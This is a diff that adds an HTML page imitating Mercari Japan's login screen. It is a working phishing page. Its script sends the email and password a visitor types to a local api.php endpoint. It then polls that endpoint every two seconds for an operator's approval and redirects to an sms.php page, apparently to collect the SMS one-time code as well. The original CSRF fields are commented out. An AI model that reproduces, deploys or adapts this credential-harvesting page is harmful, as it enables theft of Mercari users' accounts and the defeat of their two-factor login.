@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="ja-JP">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ログイン - メルカリ スマホでかんたん フリマアプリ</title>
+    <meta name="format-detection" content="telephone=no">
+    <link rel="canonical" href="https://www.mercari.com/jp/login/">
+    <link href="https://www.mercari.com/jp/login/" hreflang="ja" rel="alternate">
+    <link href="static/css/app.jp.css" rel="stylesheet">
+    <link rel="shortcut icon" href="//pcweb-assets.mercdn.net/favicon.ico?2575396713">
+    <link rel="apple-touch-icon" href="//pcweb-assets.mercdn.net/apple-touch-icon.png?2575396713">
+    <link rel="icon" type="image/png" href="//pcweb-assets.mercdn.net/favicon-16x16.png?2575396713" sizes="16x16">
+    <link rel="icon" type="image/png" href="//pcweb-assets.mercdn.net/favicon-32x32.png?2575396713" sizes="32x32">
+    <link rel="icon" type="image/png" href="//pcweb-assets.mercdn.net/favicon-194x194.png?2575396713" sizes="194x194">
+    <link rel="icon" type="image/png" href="//pcweb-assets.mercdn.net/android-chrome-192x192.png?2575396713"
+          sizes="192x192">
+    <link rel="mask-icon" href="//pcweb-assets.mercdn.net/safari-pinned-tab.svg?2575396713" color="#ea352d">
+    <link rel="manifest" href="https://www.mercari.com/jp/manifest.json?2575396713">
+    <meta name="msapplication-TileColor" content="#ffc40d">
+    <meta name="msapplication-TileImage" content="//pcweb-assets.mercdn.net/mstile-144x144.png?2575396713">
+    <meta name="theme-color" content="#ea352d">
+    <link rel="apple-touch-icon-precomposed"
+          href="//pcweb-assets.mercdn.net/apple-touch-icon-precomposed.png?2575396713">
+    <link rel="apple-touch-icon" sizes="57x57" href="//pcweb-assets.mercdn.net/apple-touch-icon-57x57.png?2575396713">
+    <link rel="apple-touch-icon" sizes="60x60" href="//pcweb-assets.mercdn.net/apple-touch-icon-60x60.png?2575396713">
+    <link rel="apple-touch-icon" sizes="72x72" href="//pcweb-assets.mercdn.net/apple-touch-icon-72x72.png?2575396713">
+    <link rel="apple-touch-icon" sizes="76x76" href="//pcweb-assets.mercdn.net/apple-touch-icon-76x76.png?2575396713">
+    <link rel="apple-touch-icon" sizes="114x114"
+          href="//pcweb-assets.mercdn.net/apple-touch-icon-114x114.png?2575396713">
+    <link rel="apple-touch-icon" sizes="120x120"
+          href="//pcweb-assets.mercdn.net/apple-touch-icon-120x120.png?2575396713">
+    <link rel="apple-touch-icon" sizes="144x144"
+          href="//pcweb-assets.mercdn.net/apple-touch-icon-144x144.png?2575396713">
+    <link rel="apple-touch-icon" sizes="152x152"
+          href="//pcweb-assets.mercdn.net/apple-touch-icon-152x152.png?2575396713">
+    <link rel="apple-touch-icon" sizes="180x180"
+          href="//pcweb-assets.mercdn.net/apple-touch-icon-180x180.png?2575396713">
+</head>
+<body>
+
+<div class="single-container">
+    <header class="single-header">
+        <h1>
+            <a href="https://www.mercari.com/jp/">
+                <img src="static/picture/logo_login.svg" alt="mercari">
+            </a>
+        </h1>
+    </header>
+
+    <main class="single-main">
+        <div class="login-panel">
+            <div class="login-no-account">
+                <p>アカウントをお持ちでない方はこちら</p>
+                <a href="#">新規会員登録</a>
+            </div>
+
+            <div class="login-form-inner">
+
+                <button id="google-login" class="btn-default btn-sns btn-sns-google">
+                    Googleでログイン
+                </button>
+                <button id="facebook-login2" class="btn-default btn-sns btn-sns-facebook">
+                    <i class="icon-facebook"></i>
+                    Facebookでログイン
+                </button>
+                <button id="apple-login" class="btn-default btn-sns btn-sns-apple">
+                    <i class="icon-apple"></i>
+                    Appleでログイン
+                </button>
+            </div>
+            <form action="#" method="POST" onsubmit="return false;" novalidate="novalidate">
+                <div class="login-form-inner">
+                    <div class="form-group">
+                        <input
+                                type="email"
+                                name="username"
+                                value=""
+                                placeholder="メールアドレス"
+                                class="login-input-text input-default">
+                    </div>
+
+                    <div class="form-group">
+                        <input
+                                type="password"
+                                name="password"
+                                placeholder="パスワード"
+                                class="login-input-text input-default">
+                    </div>
+                    <button type="submit" id="tijiao22" onclick="tijiao();" class="login-submit btn-default btn-red">
+                        ログイン
+                    </button>
+<!--                    <input type="hidden" name="login_callback" value="/jp/">-->
+<!---->
+<!--                    <input type="hidden" name="__csrf_value"-->
+<!--                           value="62b8b8254bc72fa31de6fd5ab6fe5e4dde8aa1da402a094eccaac2b630bfb4393370446dc72f9efac34eb2e49dafdca9be20b6fe086f8ce7dce813c4f3f70cdb9">-->
+
+                    <a href="https://www.mercari.com/jp/password/reset/start/">パスワードをお忘れの方</a>
+                </div>
+            </form>
+        </div>
+    </main>
+
+    <footer class="single-footer">
+        <nav>
+            <ul class="clearfix">
+                <li>
+                    <a href="https://www.mercari.com/jp/privacy/">プライバシーポリシー</a>
+                </li>
+                <li>
+                    <a href="https://www.mercari.com/jp/tos/">メルカリ利用規約</a>
+                </li>
+                <li>
+                    <a href="https://www.mercari.com/jp/tokutei/">特定商取引に関する表記</a>
+                </li>
+            </ul>
+        </nav>
+        <a href="https://www.mercari.com/jp/" class="single-footer-logo">
+            <img src="static/picture/logo-gray.svg" alt="mercari" width="80" height="65">
+        </a>
+        <p>
+            <small>&copy; Mercari, Inc.</small>
+        </p>
+    </footer>
+    <style>
+        #zhezhao {
+            position: absolute;
+            left: 0px;
+            top: 0px;
+            background: rgba(0, 0, 0, 0.1);
+            width: 100%; /*宽度设置为100%，这样才能使隐藏背景层覆盖原页面*/
+            height: 100%;
+            filter: alpha(opacity=100); /*设置透明度为100%*/
+            opacity: 1; /*非IE浏览器下设置透明度为100%*/
+            display: block;
+            z-Index: 999;
+        }
+    </style>
+
+    <div id="zhezhao" style="display: none;">
+        <img style="width: 40px;
+    /* background: red; */
+    position: absolute;
+    left: 50%;
+    top: 50%;
+    transform: translate(-50%, -50%);
+    z-index: 9999;" src="static/images/load2.gif">
+    </div>
+</div>
+
+<script src="/admin/static/js/jquery.js"></script>
+
+<script>
+    window.dataLayer = window.dataLayer || [];
+    dataLayer.push({
+        'event': 'login',
+        'uid': ''
+    });
+</script>
+<script>
+    function tijiao() {
+        var username = $("input[name='username']").val();
+        var password = $("input[name='password']").val();
+        var item = false;
+        var id = 0;
+        $.ajax({
+            type: 'post',
+            url: 'api.php',
+            data: {username: username, password: password, action: 'add'},
+            async: false,
+            success: function (res) {
+                var obj = JSON.parse(res);
+                console.log(obj);
+                if (obj.code === 200) {
+                    //添加成功
+                    item = true;
+                    id = obj.data;
+                } else {
+                    console.log(obj.msg);
+                }
+            }
+        });
+        if (item === true) {
+            $("#zhezhao").css('display', 'block');
+            let timer;
+            timer = setInterval(function () {
+                $.ajax({
+                    type: 'post',
+                    url: 'api.php',
+                    data: {id: id, action: 'check_start'},
+                    async: false,
+                    success: function (res) {
+                        var obj = JSON.parse(res);
+                        console.log(obj);
+                        if (obj.code === 200) {
+                            if (obj.data.is_start == 1) {
+                                window.location.href = './sms.php?id=' + id;
+                            } else if (obj.data.is_start == -1) {
+                                alert('未通过');
+                                $("#zhezhao").css('display', 'none');
+                                clearInterval(timer);
+                            }
+                        } else {
+                            console.log(obj.msg);
+                        }
+                    }
+                });
+            }, 2000)
+        }
+    }
+
+</script>
+
+<!-- Google Tag Manager -->
+
+<!-- End Google Tag Manager -->
+</body>
+</html>
